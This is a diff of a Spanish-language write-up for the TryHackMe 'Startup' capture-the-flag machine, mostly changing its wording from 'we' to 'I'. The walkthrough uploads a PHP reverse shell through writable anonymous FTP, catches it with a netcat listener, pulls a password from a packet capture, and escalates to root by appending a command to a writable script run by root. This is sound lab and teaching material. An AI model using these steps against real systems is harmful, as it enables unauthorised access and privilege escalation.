@@ -52,13 +52,13 @@ tags:
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 ```
-Nos descargamos notice.txt y important.jpg... pero no obtenemos nada que sea de utilidad.
+Descargo notice.txt y important.jpg... pero no obtengo nada que sea de utilidad.
 
-Al visitar la web vemos el siguiente mensaje:
+Al visitar la web veo el siguiente mensaje:
 
 > No spice here!
 Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!
-Dev Team
+Dev Team.
 
 ### Fuzzing
 ```
@@ -66,50 +66,50 @@ Dev Team
 /files
 ```
 
-Navegamos hasta el directorio `/file` y vemos los siguientes archivos:
+Navego hasta el directorio `/file` y veo los siguientes archivos:
 
 ![](/assets/images/thm-startup/files.png)
 
 Són los mismos archivos que hay en el servidor ftp, en la carpeta ftp tenemos permisos de lectura escritura y ejecución.
-No descargamos una reverse shell.
+Me descargo una reverse shell.
  
 ```
 ❯ wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
 ```
 
-Descomprimimos nuestra shell.
+Descomprimo la shell.
 
 ```
 ❯ tar xzvf php-reverse-shell-1.0.tar.gz
 ```
 
-Configuramos nuestra shell con nuestra ip de atacante.
+Configuro la shell con mi ip de atacante.
 
 ![](/assets/images/thm-startup/reverseconf.png)
 
-Nos conectamos de nuevo al FTP, nos vamos al directorio `/ftp` y subimos el fichero.php.
+Me conecto de nuevo al FTP, voy al directorio `/ftp` y subo la shell.
 
 ```
 put php-reverse-shell.php
 ```
 
-Nos vamos al navegador web al directorio `/files/ftp` y nos aparace nuestra shell.
+Abro firefox y voy al directorio `/files/ftp` veo la shell que he subido.
 
 ![](/assets/images/thm-startup/php-reverse.png)
 
-Ponemos un netcat a la escucha para obtener nuestra querida shell.
+Dejo un netcat a la escucha para obtener mi querida shell.
 
 ```
 ❯ nc -lvnp 1234
 ```
 
-Volvemos al directorio `/files/ftp` de la página web, hacemos click en `php-reverse-shell.php` y nos devolverá una shell.
+Vuelvo al directorio `/files/ftp` de la página web, hago click en `php-reverse-shell.php` y nos devolverá una shell.
 
 ![](/assets/images/thm-startup/www-data.png)
 
 ### Tratamiento TTY
 
-Configuramos nuestra shell para tener una terminal interactiva y funcional.
+Configuro la shell para tener una terminal interactiva y funcional.
 
 ```
 script /dev/null -c bash
@@ -124,10 +124,10 @@ export SHELL=bash
 
 ### User Pivoting
 
-Lanzamos un ls -la y vemos un archivo "recipe.txt" este nos dice el ingrediente secreto "love" que necesitamos para la web de THM y luego tenemos
-un directorio llamado `/incident` dentro un archivo llamado `suspicious.pcapng`
+Lanzo un ls -la y veo un archivo "recipe.txt" este nos dice el ingrediente secreto "love", love es el ingrediente que necesitamos para la web de THM y luego veo
+un directorio llamado `/incident` dentro un archivo llamado suspicious.pcapng.
 
-Lo descargamos y lo analizamos con wireshark, filtramos por http, seguimos el flujo tcp y encontraremos un login fallido con el user www-data y una contraseña.
+Lo descargo y lo analizo con wireshark, filtramos por http, seguimos el flujo tcp y encontraremos un login fallido con el user www-data y una contraseña.
 
 ![](/assets/images/thm-startup/pcapPasswd.png)
 
@@ -135,14 +135,14 @@ Lo descargamos y lo analizamos con wireshark, filtramos por http, seguimos el fl
 
 `su lennie`
 
-Probamos la passwd con el usuario lennie y ahora ya podemos leer `user.txt`
+Pruebo la passwd con el usuario lennie y ahora ya puedo leer la flag de user.
 
-Usamos cat para leer el user.txt: `cat user.txt`
+`cat user.txt`
  
 THM{03cXXXXXXXXXXXXXXXXXXXXXXXXXXe79}
 
 ### Privesc
-Desde el home de lennie lanzamos un `ls -laR`
+Desde el home de lennie lanzo un `ls -laR` para ver directorios y archivos.
 ```
 ./Documents:
 -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
@@ -154,20 +154,21 @@ Desde el home de lennie lanzamos un `ls -laR`
 -rw-r--r-- 1 root   root      1 Aug 19 14:23 startup_list.txt
 ```
 ### Fichero planner.sh
-Veamos que contiene: `cat planner.sh` 
+`cat planner.sh` 
 ```bash
+
 #!/bin/bash
 echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 ```
 ### Fichero print.sh
-Miramos el contenido del siguiente archivo: `cat /etc/print.sh`
+`cat /etc/print.sh`
 ```bash
 #!/bin/bash
 echo "Done!"
 ```
 ### Fichero startup_list.txt
-Fichero vacío
+Fichero vacío.
 
 ### Fichero concern.txt
 `cat concern.txt` 
@@ -184,11 +185,11 @@ Fichero vacío
 > Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
 > Recordatorios: Habla con Inclinant sobre nuestra falta de seguridad, contrata a un desarrollador web, borra los registros de incidencias.
 
-El archivo print.sh tiene permisos de escritura
+El archivo print.sh tiene permisos de escritura.
 
 `echo 'cat /root/root.txt > /home/lennie/root.txt' >> /etc/print.sh`
 
-Comprobamos que el fichero print.sh se ha modificado
+Comprobamos que el fichero print.sh se ha modificado.
 
 `cat /etc/print.sh`
 ```bash
@@ -197,7 +198,7 @@ echo "Done!"
 cat /root/root.txt > /home/lennie/root.txt
 ```
 
-Esperamos unos segundos y nos aparecerá el fichero root.txt en el home de lennie
+Esperamos unos segundos y nos aparecerá el fichero root.txt en el home de lennie.
 
 Lanzamos un: `cat root.txt`
 
